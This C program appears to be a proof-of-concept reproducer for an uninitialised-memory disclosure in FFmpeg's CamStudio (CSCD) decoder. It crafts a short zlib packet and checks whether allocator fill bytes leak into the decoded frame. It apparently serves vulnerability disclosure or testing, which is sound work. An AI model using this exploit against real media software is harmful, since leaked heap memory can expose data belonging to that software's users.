#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "libavcodec/avcodec.h"
#include "libavcodec/packet.h"
#include "libavutil/frame.h"

#include <zlib.h>

#define WIDTH 5
#define HEIGHT 1
#define BITS_PER_PIXEL 24
#define DECOMP_SIZE 16
#define RAW_SIZE 12
#define COPY_SIZE 15
#define DISCLOSED_SIZE (COPY_SIZE - RAW_SIZE)

int main(void)
{
    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_CSCD);
    AVCodecContext *context = NULL;
    AVPacket *packet = NULL;
    AVFrame *frame = NULL;
    uint8_t raw[RAW_SIZE] = { 0 };
    uint8_t compressed[128];
    uLongf compressed_size = sizeof(compressed) - 2;
    int ret = 1;

    if (!codec ||
        compress2(compressed + 2, &compressed_size, raw, sizeof(raw),
                  Z_BEST_COMPRESSION) != Z_OK)
        goto done;

    /* zlib compression (1) plus the keyframe bit. Byte one is unused. */
    compressed[0] = 3;
    compressed[1] = 0;

    context = avcodec_alloc_context3(codec);
    packet = av_packet_alloc();
    frame = av_frame_alloc();
    if (!context || !packet || !frame)
        goto done;

    context->width = WIDTH;
    context->height = HEIGHT;
    context->bits_per_coded_sample = BITS_PER_PIXEL;
    if (avcodec_open2(context, codec, NULL) < 0 ||
        av_new_packet(packet, (int)compressed_size + 2) < 0)
        goto done;

    memcpy(packet->data, compressed, compressed_size + 2);
    if (avcodec_send_packet(context, packet) < 0)
        goto done;
    ret = avcodec_receive_frame(context, frame);
    if (ret < 0)
        goto done;

    fprintf(stderr,
            "codec=camstudio width=%d height=%d bpp=%d compression=zlib "
            "decomp_size=%d decompressed=%d copied=%d disclosed=%d\n",
            WIDTH, HEIGHT, BITS_PER_PIXEL, DECOMP_SIZE, RAW_SIZE, COPY_SIZE,
            DISCLOSED_SIZE);
    fprintf(stderr,
            "allocator_fill=a5 decoded_tail=%02x%02x%02x expected=a5a5a5\n",
            frame->data[0][RAW_SIZE], frame->data[0][RAW_SIZE + 1],
            frame->data[0][RAW_SIZE + 2]);
    ret = frame->data[0][RAW_SIZE] == 0xA5 &&
          frame->data[0][RAW_SIZE + 1] == 0xA5 &&
          frame->data[0][RAW_SIZE + 2] == 0xA5 ? 0 : 2;

done:
    av_frame_free(&frame);
    av_packet_free(&packet);
    avcodec_free_context(&context);
    return ret;
}
